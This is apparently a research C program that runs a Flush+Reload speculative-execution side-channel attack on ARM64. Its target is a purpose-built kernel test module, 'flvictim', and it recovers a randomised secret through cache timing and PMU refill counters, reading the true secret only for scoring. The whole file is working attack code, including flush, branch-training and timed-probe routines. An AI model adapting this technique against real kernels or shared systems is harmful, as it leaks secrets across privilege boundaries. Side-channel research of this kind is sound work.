// SPDX-License-Identifier: GPL-2.0
/*
 * Userspace Flush+Reload attacker for the flvictim module.
 *
 * The victim runs the Gk gadget on a SHARED page: architectural [x1] -> fixed ANCHOR (always
 * resident), speculative [x0] -> SECRET (accessed only on the trained-branch misprediction).
 * We recover the secret from cache state using BOTH a timer (cntvct) and the L2D_CACHE_REFILL PMU
 * counter (made EL0-readable by the module). The syscall round-trip warms a fixed set of lines every
 * time, so we CALIBRATE a per-set baseline and subtract it -- constant noise cancels, only the
 * round-varying secret line stands out. We never read the secret to guess (FLV_GET scores only).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define STRIDE 4160u
#define NSYM   64u
#define CORE   2
#define NS_THRESH 90

#define FLV_MAGIC 'F'
#define FLV_RANDOMIZE  _IO(FLV_MAGIC, 1)
#define FLV_TRIGGER    _IO(FLV_MAGIC, 2)
#define FLV_GET        _IOR(FLV_MAGIC, 3, unsigned long)
#define FLV_SET        _IOW(FLV_MAGIC, 4, unsigned long)
#define FLV_REGION     _IOR(FLV_MAGIC, 5, unsigned long)
#define FLV_ANCHOR     _IOR(FLV_MAGIC, 6, unsigned long)
#define FLV_ENABLE_PMU _IO(FLV_MAGIC, 7)

static int fd;
static volatile char *probe;

/* one load, four numbers: cntvct delta, L2D refill delta, L3D refill delta (0 => resident at that level) */
static inline void measure(const volatile char *a, uint64_t *ns, uint64_t *l2, uint64_t *l3)
{
	uint64_t t0, t1, a0, a1, b0, b1, v;
	__asm__ __volatile__(
		"isb\n mrs %[a0], pmevcntr0_el0\n mrs %[b0], pmevcntr1_el0\n mrs %[t0], cntvct_el0\n isb\n"
		"ldrb %w[v], [%[a]]\n"
		"cbnz %w[v], 1f\n 1:\n"
		"dsb sy\n isb\n"
		"mrs %[t1], cntvct_el0\n mrs %[a1], pmevcntr0_el0\n mrs %[b1], pmevcntr1_el0\n"
		: [t0]"=&r"(t0), [t1]"=&r"(t1), [a0]"=&r"(a0), [a1]"=&r"(a1),
		  [b0]"=&r"(b0), [b1]"=&r"(b1), [v]"=&r"(v)
		: [a]"r"(a) : "memory", "cc");
	*ns = t1 - t0; *l2 = a1 - a0; *l3 = b1 - b0;
}
static inline void flush(const volatile char *a) { __asm__ __volatile__("dc civac, %0" :: "r"(a) : "memory"); }
static unsigned bitrev6(unsigned x) { unsigned r = 0; for (int i = 0; i < 6; ++i) { r = (r << 1) | (x & 1); x >>= 1; } return r; }

/* one flush -> train(20) -> measured trigger -> read every entry at L2, L3, and time. */
static void one_shot(int train_n, int *h2, int *h3, int *ht)
{
	for (int i = 0; i < train_n; ++i) ioctl(fd, FLV_TRIGGER, 0);
	for (unsigned i = 0; i < NSYM; ++i) flush(probe + (size_t)i * STRIDE);
	__asm__ __volatile__("dsb sy\nisb\n" ::: "memory");
	ioctl(fd, FLV_TRIGGER, 0);
	__asm__ __volatile__("dsb sy\nisb\n" ::: "memory");
	for (unsigned c = 0; c < NSYM; ++c) {
		unsigned i = bitrev6(c);
		uint64_t ns, l2, l3; measure(probe + (size_t)i * STRIDE, &ns, &l2, &l3);
		h2[i] = (l2 == 0);           /* in L2 (or better) */
		h3[i] = (l3 == 0);           /* in L3 (or better) */
		ht[i] = (ns < NS_THRESH);    /* fast */
	}
}

int main(int argc, char **argv)
{
	int rounds = argc > 1 ? atoi(argv[1]) : 20;
	int traces = argc > 2 ? atoi(argv[2]) : 8;
	int train  = argc > 3 ? atoi(argv[3]) : 20;

	cpu_set_t set; CPU_ZERO(&set); CPU_SET(CORE, &set);
	sched_setaffinity(0, sizeof(set), &set);

	fd = open("/dev/flvictim", O_RDWR);
	if (fd < 0) { perror("open /dev/flvictim"); return 1; }
	ioctl(fd, FLV_ENABLE_PMU, 0);
	unsigned long region = 0, anchor = 0;
	ioctl(fd, FLV_REGION, &region); ioctl(fd, FLV_ANCHOR, &anchor);
	probe = mmap(NULL, region, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (probe == MAP_FAILED) { perror("mmap"); return 1; }
	printf("[i] %u entries  anchor=set%lu  core=%d  measure: L2D + L3D refill PMU + cntvct(<%dns)\n",
	       NSYM, anchor, CORE, NS_THRESH);

	/* baseline: per-set hit rate with random secrets (captures the constant syscall-path pollution) */
	double b2[NSYM] = {0}, b3[NSYM] = {0}, bt[NSYM] = {0};
	int CAL = 40, h2[NSYM], h3[NSYM], ht[NSYM];
	for (int k = 0; k < CAL; ++k) {
		ioctl(fd, FLV_RANDOMIZE, 0);
		one_shot(train, h2, h3, ht);
		for (unsigned i = 0; i < NSYM; ++i) { b2[i] += h2[i]; b3[i] += h3[i]; bt[i] += ht[i]; }
	}
	for (unsigned i = 0; i < NSYM; ++i) { b2[i] /= CAL; b3[i] /= CAL; bt[i] /= CAL; }
	printf("[i] baseline (%d shots); anchor: L2=%.2f L3=%.2f time=%.2f\n",
	       CAL, b2[anchor], b3[anchor], bt[anchor]);

	int ok2 = 0, ok3 = 0, okt = 0, anchor_seen = 0;
	for (int r = 0; r < rounds; ++r) {
		ioctl(fd, FLV_RANDOMIZE, 0);
		double s2[NSYM] = {0}, s3[NSYM] = {0}, st[NSYM] = {0};
		int a_hits = 0;
		for (int t = 0; t < traces; ++t) {
			one_shot(train, h2, h3, ht);
			for (unsigned i = 0; i < NSYM; ++i) { s2[i] += h2[i]; s3[i] += h3[i]; st[i] += ht[i]; }
			a_hits += h2[anchor];
		}
		int g2 = -1, g3 = -1, gt = -1;
		for (unsigned i = 0; i < NSYM; ++i) {
			if (i == anchor) continue;
			if (g2 < 0 || s2[i]/traces - b2[i] > s2[g2]/traces - b2[g2]) g2 = i;
			if (g3 < 0 || s3[i]/traces - b3[i] > s3[g3]/traces - b3[g3]) g3 = i;
			if (gt < 0 || st[i]/traces - bt[i] > st[gt]/traces - bt[gt]) gt = i;
		}
		unsigned long secret = 0; ioctl(fd, FLV_GET, &secret);   /* reveal -- SCORING ONLY */
		ok2 += (g2 == (int)secret); ok3 += (g3 == (int)secret); okt += (gt == (int)secret);
		anchor_seen += (a_hits > traces / 2);
		printf("  round %2d: secret=set%2lu | L2->set%2d L3->set%2d time->set%2d | anchor %d/%d  %s\n",
		       r, secret, g2, g3, gt, a_hits, traces,
		       (g2 == (int)secret || g3 == (int)secret || gt == (int)secret) ? "LEAK" : "");
	}
	printf("=== over %d rounds:  L2 %d/%d(%.0f%%)  L3 %d/%d(%.0f%%)  timer %d/%d(%.0f%%) | anchor %d/%d ===\n",
	       rounds, ok2, rounds, 100.0*ok2/rounds, ok3, rounds, 100.0*ok3/rounds,
	       okt, rounds, 100.0*okt/rounds, anchor_seen, rounds);
	return 0;
}
